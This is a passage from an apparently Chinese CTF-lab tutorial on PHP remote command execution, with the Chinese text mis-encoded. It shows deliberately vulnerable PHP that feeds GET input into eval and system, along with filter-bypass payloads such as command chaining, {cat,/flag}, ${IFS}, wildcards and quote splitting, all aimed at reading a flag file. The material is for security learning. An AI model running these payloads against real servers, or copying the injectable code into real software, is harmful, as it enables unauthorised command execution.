ä¸ºpopençš„åŸç†æ˜¯åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ï¼Œä½†æ˜¯ä»–æœ¬èº«å…¶å®å¹¶ä¸å­˜åœ¨ï¼Œè€Œæ˜¯å±äºä¸€ä¸ªé—´æ¥çš„ä½œç”¨ã€‚è¿™ä¸ªè™šæ‹Ÿæ–‡ä»¶æ¥æš‚æ—¶å­˜å‚¨æˆ‘ä»¬å‘½ä»¤æ‰§è¡Œçš„å†…å®¹ï¼Œç„¶åæˆ‘ä»¬å¯¹è¿™ä¸ªè™šæ‹Ÿæ–‡ä»¶è¿›è¡Œæ“ä½œã€‚ä¾‹å¦‚æˆ‘ä»¬è¾“å…¥lsï¼Œå®ƒä¼šæŠŠlsçš„æ‰§è¡Œç»“æœæ”¾å…¥åˆ°è¿™ä¸ªè™šæ‹Ÿæ–‡ä»¶ä¸­ã€‚</p></li><li><p>å‚æ•°</p><p>æœ‰ä¸¤ä¸ªï¼Œç¬¬ä¸€ä¸ªå‚æ•°ç”¨æ¥è¡¨ç¤ºæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ç”¨æ¥è¡¨ç¤ºæˆ‘ä»¬è¯»å–è¿™ä¸ªè™šæ‹Ÿæ–‡ä»¶çš„æ–¹å¼ï¼Œæœ‰â€˜râ€™è¯»å–ï¼Œæˆ–è€…â€˜wâ€™å†™å…¥ï¼Œä¸¤ç§</p></li><li><p>å›æ˜¾</p><p>æ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦ä¸€äº›æ–‡ä»¶è¯»å–å‡½æ•°å»æ“ä½œè¿™ä¸ªè™šæ‹Ÿæ–‡ä»¶ï¼Œæ‰èƒ½å¾—åˆ°å‘½ä»¤æ‰§è¡Œçš„ç»“æœã€‚</p></li></ul></blockquote><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230816223721060.png" alt="image-20230816223721060"></p><h2 id="é¶åœºè¿‡æ»¤ç»ƒä¹ "><a href="#é¶åœºè¿‡æ»¤ç»ƒä¹ " class="headerlink" title="é¶åœºè¿‡æ»¤ç»ƒä¹ "></a>é¶åœºè¿‡æ»¤ç»ƒä¹ </h2><h4 id="1-æ›¿æ¢ï¼Œç»•è¿‡å‡½æ•°è¿‡æ»¤"><a href="#1-æ›¿æ¢ï¼Œç»•è¿‡å‡½æ•°è¿‡æ»¤" class="headerlink" title="1.æ›¿æ¢ï¼Œç»•è¿‡å‡½æ•°è¿‡æ»¤"></a>1.æ›¿æ¢ï¼Œç»•è¿‡å‡½æ•°è¿‡æ»¤</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/exec|system|popen|proc_open|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä½ æ˜¯é»‘å®¢ä¹ˆï¼Ÿ&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>preg_match()æ˜¯æˆ‘ä»¬RCEé¢˜é‡Œé¢å¾ˆå¸¸è§çš„ä¸€ç§è¿‡æ»¤å‡½æ•°</p><p>æœ‰ä¸¤ä¸ªå‚æ•° ç¬¬ä¸€ä¸ªå‚æ•°ç”¨æ¥åˆ—ä¸¾æˆ‘ä»¬æƒ³è¦è¿‡æ»¤çš„ä¸œè¥¿ï¼Œä¸€</p><p>èˆ¬é‡Œé¢çš„å†…å®¹éƒ½æ˜¯ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥è¡¨ç¤ºï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¼ </p><p>å…¥æˆ‘ä»¬è¦è¿›è¡Œè¿‡æ»¤æ“ä½œçš„å­—ç¬¦ä¸²æˆ–è€…è¯´æ˜¯ç›®æ ‡</p><p>è¦è§£ï¼Œå°±æ˜¯ä½¿ç”¨æ²¡æœ‰è¢«è¿‡æ»¤çš„ï¼Œæ¯”å¦‚passthru()</p><h4 id="2-æ“ä½œç³»ç»Ÿé“¾æ¥ç¬¦"><a href="#2-æ“ä½œç³»ç»Ÿé“¾æ¥ç¬¦" class="headerlink" title="2.æ“ä½œç³»ç»Ÿé“¾æ¥ç¬¦"></a>2.æ“ä½œç³»ç»Ÿé“¾æ¥ç¬¦</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">   <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>.<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°±æ˜¯<code>system()</code>é‡Œé¢çš„å†…å®¹å°†<code>â€œlsâ€</code>ä¸æˆ‘ä»¬å‚æ•°cmdå­—ç¬¦ä¸²è¿æ¥èµ·æ¥äº†ï¼Œå¯¼è‡´æˆ‘ä»¬è¾“å…¥cmdå‘½ä»¤æ‰§è¡Œä¸äº†</p><p>è§£å†³æ–¹æ³•ï¼šæˆ‘ä»¬å°è¯•åœ¨cmdå‘½ä»¤å‰åŠ ä¸€ä¸ª<code>è¿æ¥ç¬¦</code>ï¼Œæˆ–è€…<code>ç®¡é“è¾“å‡ºç¬¦ï¼Œå°±èƒ½å¤Ÿå®ç°åŒæ—¶æ‰§è¡Œå¤šæ¡å‘½ä»¤</code></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=;cat /flag</span><br></pre></td></tr></table></figure><blockquote><p>å¯ä»¥ç”¨<code>â€˜;â€™</code>ï¼Œä¹Ÿå¯ä»¥ç”¨<code>â€˜&amp;â€™ã€â€˜|â€™ã€â€˜||â€™ã€â€˜&amp;&amp;â€™</code></p><p><code>&#39;&amp;&amp;&#39;</code>:å®ƒæ˜¯çœ‹æˆ‘ä»¬çš„æŒ‡ä»¤å‰é¢çš„æ²¡æœ‰æˆåŠŸæ‰§è¡Œçš„è¯ï¼Œåé¢çš„ä¹Ÿä¸ä¼šæ‰§è¡Œ</p><p><code>â€˜|â€™</code>:ç®¡é“è¾“å‡ºç¬¦ç®—æ˜¯èµ·åˆ°ä¸€ä¸ªè¿‡æ»¤ç½‘çš„ä½œç”¨ï¼Œæˆ‘ä»¬å›æ˜¾çš„ç»“æœå°±ä¼šè¢«ç®¡é“è¾“å‡ºç¬¦ä»¥åŠå®ƒåé¢çš„æ¡ä»¶æ‰€è¿‡æ»¤ï¼Œæœ€ç»ˆå¾—åˆ°ç»“æœã€‚</p><p><code>â€˜||â€™</code>ç›¸å½“äºif-elseçš„ä½œç”¨</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$cmd</span>.<span class="string">&quot;&gt;/dev/null 2&gt;&amp;1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">       <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å®ƒçš„ä½œç”¨ï¼Œå¦‚æœåå°å¯¹æˆ‘ä»¬çš„æŒ‡ä»¤è¿›è¡Œäº†å¤„ç†ï¼Œæ¯”å¦‚è¯´å°†æˆ‘ä»¬çš„æ‰€æœ‰</p><p>æŒ‡ä»¤å…¨éƒ¨â€˜æ”¾å…¥åƒåœ¾æ¡¶â€™ï¼Œå°±é€šè¿‡åœ¨cmdå˜é‡æœ€åè¾“å…¥â€˜||â€™å°±åªä¼šæ‰§</p><p>è¡Œæˆ‘ä»¬çš„æƒ³è¦çš„æŒ‡ä»¤ï¼Œåé¢çš„åƒåœ¾æ¡¶æ“ä½œå°±ä¸ä¼šå»æ‰§è¡Œäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>è¿™æ¡ä»£ç çš„ä½œç”¨å°±æ˜¯å°†æˆ‘ä»¬çš„æŒ‡ä»¤ä¸¢å…¥åƒåœ¾æ¡¶çš„ä½œç”¨ä»£ç ï¼Œç‰¹å¾å¾ˆæ˜</p><p>æ˜¾ æœ€é‡è¦çš„æ˜¯åé¢çš„ <strong>2&gt;&amp;1</strong></p><h4 id="3-è¿‡æ»¤ç»•è¿‡"><a href="#3-è¿‡æ»¤ç»•è¿‡" class="headerlink" title="3.è¿‡æ»¤ç»•è¿‡"></a>3.è¿‡æ»¤ç»•è¿‡</h4><p>1.ç©ºæ ¼è¿‡æ»¤ä»¥åŠç»•è¿‡æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;# #&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;è¿‡æ»¤åçš„å‘½ä»¤ï¼š&quot;</span>.<span class="variable">$cmd</span>.<span class="string">&quot;&lt;/br &gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å‘½ä»¤æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>ç»•è¿‡æ–¹æ³•</p><h5 id="1-å¤§æ‹¬å·ç»•è¿‡"><a href="#1-å¤§æ‹¬å·ç»•è¿‡" class="headerlink" title="1.å¤§æ‹¬å·ç»•è¿‡"></a>1.å¤§æ‹¬å·ç»•è¿‡</h5><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;cat,/flag&#125;</span><br></pre></td></tr></table></figure><p>{}çš„ä½œç”¨å°±æ˜¯èµ·åˆ°ä¸€ä¸ªé‡Œé¢çš„é€—å·â€˜,â€™å……å½“ç©ºæ ¼çš„ä½œç”¨ã€‚</p><p>æ­£å¸¸linuxä¸‹ï¼Œæ‰“å°flagå‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /flag</span><br><span class="line">___^____</span><br></pre></td></tr></table></figure><p>ä¸­é—´æ˜¯æœ‰ç©ºæ ¼çš„ï¼Œä½†æ˜¯è¿‡æ»¤äº†ç©ºæ ¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat/flag</span><br></pre></td></tr></table></figure><p>æ ¼å¼é”™è¯¯ï¼Œå‘½ä»¤æ— æ³•æ­£å¸¸æ‰§è¡Œï¼Œæ‰€ä»¥éœ€è¦ä¸€äº›å…¶ä»–æ ¼å¼ï¼Œèƒ½ä»£æ›¿ç©ºæ ¼</p><p>èµ·åˆ°åˆ†å‰²å‘½ä»¤å’Œæ“ä½œå¯¹è±¡çš„ä½œç”¨</p><hr><p>å½“éœ€è¦å¤šä¸ªç©ºæ ¼çš„å‘½ä»¤æ—¶ï¼Œç”¨{}ä¸­çš„,ä¹Ÿæ˜¯å¯ä»¥å½“åšç©ºæ ¼ï¼Œå¹¶ä¸åªæ˜¯å½“ä¸€ä¸ªç©ºæ ¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;mv,1.txt,a.txt&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230818212614623.png" alt="image-20230818212614623"></p><h5 id="2-IFS-ç»•è¿‡"><a href="#2-IFS-ç»•è¿‡" class="headerlink" title="2.${IFS}ç»•è¿‡"></a>2.${IFS}ç»•è¿‡</h5><p>å…¶å®<code>$IFS</code>çš„å½“ä½œå˜é‡ï¼Œä¸ä¼šè‡ªåŠ¨è½¬åŒ–ä¸ºç©ºæ ¼ã€‚å¯¼è‡´ç»•è¿‡å¤±è´¥</p><p>æ‰€ä»¥ä¿é™©èµ·è§è¿˜æ˜¯å†™ä¸Š{}å°†å†…å®¹åŒ…èµ·æ¥ï¼Œè¯´æ˜å®ƒä¸æ˜¯å˜é‡</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cat$&#123;IFS&#125;flag</span><br></pre></td></tr></table></figure><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230818214219207.png" alt="image-20230818214219207"></p><h5 id="3-URLç¼–ç ç»•è¿‡"><a href="#3-URLç¼–ç ç»•è¿‡" class="headerlink" title="3.URLç¼–ç ç»•è¿‡"></a>3.URLç¼–ç ç»•è¿‡</h5><p>å¦‚æœè¦ç»•è¿‡ç©ºæ ¼è¿‡æ»¤ï¼Œä¸€èˆ¬éƒ½ä¸ä¼šç”¨<code>%20</code>(ç©ºæ ¼ç¼–ç åçš„ç»“æœ)ä¸€èˆ¬éƒ½æ˜¯ç”¨<code>%09</code>(tabçš„ç¼–ç ç»“æœ)</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cat%09flag</span><br></pre></td></tr></table></figure><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230818221159957.png" alt="image-20230818221159957"></p><h5 id="4-é‡å®šå‘ç¬¦å·ç»•è¿‡"><a href="#4-é‡å®šå‘ç¬¦å·ç»•è¿‡" class="headerlink" title="4.é‡å®šå‘ç¬¦å·ç»•è¿‡"></a>4.é‡å®šå‘ç¬¦å·ç»•è¿‡</h5><blockquote><p>&lt; &lt;&gt;ä¸¤ç§æ–¹å¼</p><p>å°±æ˜¯æŠŠæˆ‘ä»¬åœ¨catåé¢åŠ ä¸Š&lt;å å°±è¡¨ç¤ºå…ˆè®©catæŒ‡ä»¤å¾…å‘½ï¼Œç„¶å</p><p>æŠŠæˆ‘ä»¬åé¢è¾“å…¥çš„å†…å®¹æ”¾å…¥catå»æ‰§è¡Œ</p><p>ä¸æ¨èä½¿ç”¨cat&lt;&gt;flag å› ä¸º&lt;&gt;ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œä¼šå¯¼è‡´ä¸€</p><p>äº›ä¸å¿…è¦çš„éº»çƒ¦ã€‚</p></blockquote><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cat&lt;flag</span><br><span class="line">?cmd=cat&lt;&gt;flag</span><br></pre></td></tr></table></figure><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230818223956380.png" alt="image-20230818223956380"> </p><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230818224106755.png" alt="image-20230818224106755"></p><h4 id="4-æ–‡ä»¶åè¿‡æ»¤-ä»¥åŠç»•è¿‡æ–¹æ³•"><a href="#4-æ–‡ä»¶åè¿‡æ»¤-ä»¥åŠç»•è¿‡æ–¹æ³•" class="headerlink" title="4.æ–‡ä»¶åè¿‡æ»¤ ä»¥åŠç»•è¿‡æ–¹æ³•"></a>4.æ–‡ä»¶åè¿‡æ»¤ ä»¥åŠç»•è¿‡æ–¹æ³•</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;å‘½ä»¤æœ‰é—®é¢˜å“¦ï¼Œæ¥é»‘æˆ‘ä¸«ï¼ï¼ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>preg_match()é‡Œé¢çš„å†…å®¹å°±æ˜¯é€šè¿‡æ­£åˆ™è¡¨è¾¾æŠŠæˆ‘ä»¬çš„flag </p><p>system phpç­‰å­—æ ·ç»™è¿‡æ»¤æ‰äº†ã€‚æˆ‘ä»¬æƒ³æƒ³æ€ä¹ˆç»•è¿‡</p><p>ç»•è¿‡æ–¹æ³•</p><h5 id="1-é€šé…ç¬¦ç»•è¿‡"><a href="#1-é€šé…ç¬¦ç»•è¿‡" class="headerlink" title="1.é€šé…ç¬¦ç»•è¿‡"></a>1.é€šé…ç¬¦ç»•è¿‡</h5><p>é€šé…ç¬¦çš„æ„æ€å°±æ˜¯å®ƒå¯ä»¥ä»£è¡¨ä»»ä½•çš„å­—æ¯ç„¶åç©·ä¸¾æ‰€æœ‰å­—æ¯ç»“æœæ¥</p><p>ä¸€ä¸ªä¸€ä¸ªå»æ‰§è¡Œå‘½ä»¤</p><p>ä¸€ä¸ªæ˜¯<code>â€˜?â€™</code> ä¸€ä¸ªæ˜¯<code>â€˜*â€™</code></p><p><code>&#39;?&#39;</code> èƒ½å¤Ÿä»£è¡¨ä»»ä½•ä¸€ä¸ªå­—ç¬¦ï¼Œä½†åªèƒ½ä»£è¡¨ä¸€ä¸ª ï¼ˆ=1ï¼‰</p><p><code>â€˜*â€™</code>æ˜Ÿå·èƒ½ä»£è¡¨æ‰€æœ‰å­—ç¬¦ ï¼ˆ&gt;=0ï¼‰</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&#x27;cat f?lg&#x27;)</span><br></pre></td></tr></table></figure><p>æ„æ€æ˜¯å°±æ˜¯cat f<code>a</code>agåˆ°f<code>z</code>agå¼€å§‹ä¸€ä¸ªä¸ªè¯•å‡ºæ¥           </p><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819103945371.png" alt="image-20230819103945371"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&#x27;cat *&#x27;)</span><br></pre></td></tr></table></figure><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819105755560.png" alt="image-20230819105755560"></p><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819110006594.png" alt="image-20230819110006594"></p><p>phpä»£ç ä¸èƒ½å®Œå…¨æ‰“å°åœ¨ç½‘é¡µä¸Šï¼Œæˆ‘ä»¬å°è¯•æŸ¥çœ‹ç½‘é¡µæºä»£ç </p><h5 id="2-â€˜-â€™åæ–œæ "><a href="#2-â€˜-â€™åæ–œæ " class="headerlink" title="2.â€˜\â€™åæ–œæ "></a>2.â€˜\â€™åæ–œæ </h5><p>\çš„ä½œç”¨å…¶å®ç®—æ˜¯ä¸€ä¸ªå‘½ä»¤è¿æ¥ç¬¦ï¼Œæˆ‘ä»¬è¾“å…¥<code>cat f\la\g</code>å®ƒå…¶å®</p><p>åœ¨linuxé‡Œé¢å°±ç›´æ¥è®¤ä¸ºä¸ºäº†cat /flag ä½†æ˜¯è¿‡æ»¤æ“ä½œåˆæ˜¯åœ¨</p><p>phpé¡µé¢é‡Œé¢ï¼Œlinuxæœ¬èº«ä¸å—å½±å“ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&#x27;cat f\la\g&#x27;)</span><br></pre></td></tr></table></figure><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819113756446.png" alt="image-20230819113756446"></p><h5 id="3-å•å¼•å·-åŒå¼•å·"><a href="#3-å•å¼•å·-åŒå¼•å·" class="headerlink" title="3.å•å¼•å· åŒå¼•å·"></a>3.å•å¼•å· åŒå¼•å·</h5><p>åŸç†ä¸€æ ·çš„ï¼Œè¿‡æ»¤æ“ä½œåªåœ¨åªåœ¨phpé¡µé¢ä¸­ï¼Œlinuxç³»ç»Ÿæ‰§è¡Œå‘½ä»¤çš„æ—¶å€™æ˜¯ä¸ä¼šå—åˆ°å½±å“çš„ï¼Œå› ä¸ºåœ¨å‘½ä»¤è¡Œé‡Œé¢ï¼Œ<code>â€œ â€ â€œ</code>ä¼šè¢«æ— è§†æ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&#x27;cat f&quot;&quot;lag.p&quot;&quot;hp&#x27;)</span><br></pre></td></tr></table></figure><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819143845143.png" alt="image-20230819143845143"></p><h5 id="4-ä¸€äº›ç‰¹æ®Šå­—ç¬¦-ç³»åˆ—"><a href="#4-ä¸€äº›ç‰¹æ®Šå­—ç¬¦-ç³»åˆ—" class="headerlink" title="4.ä¸€äº›ç‰¹æ®Šå­—ç¬¦ $ç³»åˆ—"></a>4.ä¸€äº›ç‰¹æ®Šå­—ç¬¦ $ç³»åˆ—</h5><p>åŸç†ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯å½¢å¼ä¸åŒï¼Œå› ä¸ºæ­£åˆ™åŒ¹é…å®ƒæ˜¯è¿ç»­åŒ¹é…ï¼Œå¦‚</p><p>æœè¿ç»­åŒ¹é…æˆåŠŸåˆ¤å®šä¸ºçœŸã€‚</p><p>æˆ‘ä»¬åªéœ€è¦åœ¨ä¸å½±å“å‘½ä»¤æ‰§è¡Œçš„æƒ…å†µä¸‹ï¼Œåˆ†å‰²å‘½ä»¤å°±è¡Œ</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&#x27;cat f$9lag&#x27;)</span><br></pre></td></tr></table></figure><blockquote><p><code>$9æ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹ç¬¬ä¹ä¸ªå‚æ•°æŒæœ‰è€…ï¼Œå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²</code></p></blockquote><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819152437622.png" alt="image-20230819152437622"></p><h5 id="5-å†…è”æ‰§è¡Œ"><a href="#5-å†…è”æ‰§è¡Œ" class="headerlink" title="5.å†…è”æ‰§è¡Œ"></a>5.å†…è”æ‰§è¡Œ</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&#x27;a=f;b=la;c=g;cat $a$b$c&#x27;)</span><br></pre></td></tr></table></figure><blockquote><p>æ„æ€ç¿»è¯‘è¿‡æ¥å°±æ˜¯æˆ‘ä»¬åœ¨å†…éƒ¨å®šä¹‰å˜é‡ï¼Œç„¶åç”¨å˜é‡å°†æˆ‘ä»¬çš„å‘½ä»¤æ‹¼æ¥èµ·æ¥</p></blockquote><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819153146923.png" alt="image-20230819153146923"></p><h4 id="5-catè¿‡æ»¤ç»•è¿‡"><a href="#5-catè¿‡æ»¤ç»•è¿‡" class="headerlink" title="5.catè¿‡æ»¤ç»•è¿‡"></a>5.catè¿‡æ»¤ç»•è¿‡</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|shell|\&#x27;/i&quot;</span>, <span class="variable">$cmd</span>)) 